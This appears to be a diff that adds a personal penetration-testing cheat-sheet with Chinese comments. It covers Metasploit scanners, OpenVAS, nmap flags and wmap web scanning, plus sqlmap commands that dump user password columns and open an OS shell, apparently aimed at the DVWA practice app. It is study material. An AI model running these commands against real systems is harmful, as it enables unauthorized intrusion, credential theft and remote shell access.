@@ -1,0 +1,67 @@
+1.scan_with_meta
+auxiliary/scanner/portscan/syn
+auxiliary/scanner/ssh/ssh_login
+auxiliary/scanner/ssh/ssh_version
+auxiliary/scanner/telnet/telnet_version
+auxiliary/scanner/http/open_proxy
+auxiliary/scanner/oracle/tnslanr_version
+auxiliary/sniffer/psnuffle
+use
+info
+
+2.msf_openvas
+load openvas
+openvas_help
+openvas_connect admin 1234 127.0.0.1 9390 ok
+openvas_config_list
+openvas_target_list
+a:openvas_target_create
+b:openvas_task_create
+openvas_task_list
+c:openvas_task_start
+d:openvas_format_list
+e:openvas_report_list
+f:openvas_report_import (to msf)
+g:vulns
+openvas_report_download
+
+3.nmap
+/usr/share/nmap/scripts
+-Pn 探测主机之前不发送ping
+-sV 详细探测指纹等
+-sS/T/A/U/P "scan with syn/tcp/ack/udp/ping"
+
+
+4.database
+service postgresql start
+db_status
+db_import
+hosts
+services
+vulns
+
+5.postgresql
+sudo -u postgres psql
+ALTER USER postgres WITH PASSWORD 'postgres';
+
+6.wmap
+load wmap
+wmap_sites -a http://www.dvssc.com
+wmap_sites -l
+wmap_targets -d 0
+wmap_run -t(展示一起测试的所有模块)
+wmap_run -e(开始攻击)
+
+7.sqlmap
+sqlmap -u '' --cookie='' --dbs
+sqlmap -u '' --cookie='' -D dvwa --tables
+sqlmap -u '' --cookie='' -D dvwa -T users --columns
+sqlmap -u '' --cookie='' -D dvwa -T users -C user,password --dump
+sqlmap -u '' --cookie='' --dump-all  #所有数据库所有内容
+sqlmap -u '' --cookie='' --os-shell
+
+8.w3af
+
+
+/* xssf */
+/* wXf */
